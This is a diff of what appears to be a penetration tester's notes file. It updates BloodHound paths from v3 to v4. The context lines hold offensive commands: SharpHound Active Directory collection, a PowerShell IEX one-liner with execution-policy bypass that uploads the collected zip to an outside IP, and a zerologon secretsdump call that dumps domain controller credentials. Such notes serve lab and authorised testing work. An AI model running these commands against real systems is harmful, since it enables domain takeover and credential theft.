@@ -65,7 +65,7 @@ firefox http://localhost:7474/ &
 username/password: neo4j
 Change the password
 
-cd /opt/BloodHound-v3/Ingestors/
+cd /opt/BloodHound-v4/Collectors/
 python -m SimpleHTTPServer
 
 - Windows
@@ -76,12 +76,11 @@ SharpHound.exe -c LoggedOn                        Run the following as a user th
 SharpHound.exe -c Session                         On subseqequent runs just collect session data
 
 This will generate a zip file
-
-Upload the zip file to Kali
+Upload the file to Kali
 powershell -nop -exec bypass "IEX (New-Object Net.Webclient).UploadString('http://192.168.1.5/sharp.zip',"<PostDATA>")"
 
 - BloodHound UI
-cd /opt/BloodHound-3/BloodHound-linux-x64/
+cd /opt/BloodHound-v4/BloodHound-linux-x64/
 ./BloodHound --no-sandbox
 Login
 Drag and drop the zip file into the UI
@@ -296,4 +295,3 @@ chmod 755 *.py
 
 cd ../zerologon-virtualenv/bin/
 secretsdump.py -no-pass -just-dc lab.corp/dc-1\$@192.168.0.20
-
